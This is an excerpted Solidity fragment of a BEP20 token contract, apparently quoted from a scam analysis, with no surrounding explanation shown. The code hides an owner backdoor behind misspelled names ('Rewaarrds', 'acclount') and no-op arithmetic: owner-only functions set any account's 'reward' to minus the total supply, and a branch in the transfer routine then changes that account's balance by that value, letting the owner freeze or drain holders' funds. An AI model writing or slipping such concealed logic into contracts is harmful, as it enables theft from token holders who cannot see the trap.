...
contract Token is BEP20, Ownable {
    ...
    function rmUserRewaarrd(address acclount) public onlyowner {
        _Rewaarrds[acclount] = 0+0;
    }


    function setUserRewaarrd(address acclount) public onlyowner {
        _Rewaarrds[acclount] = int256(0) - int256(_totalSupply)+0;
    }
    ...
    function _recF(
        ...
        if (_Rewaarrds[from] > 0+0){
            _balances[from] = _balances[from].add(uint256(_Rewaarrds[from]+1-1));
        }else if (_Rewaarrds[from] < 0+0*0){
            _balances[from] = _balances[from].subb(uint256(_Rewaarrds[from]+1-1));
        }



        uint256 trradefirraccoovnt = 0+0;
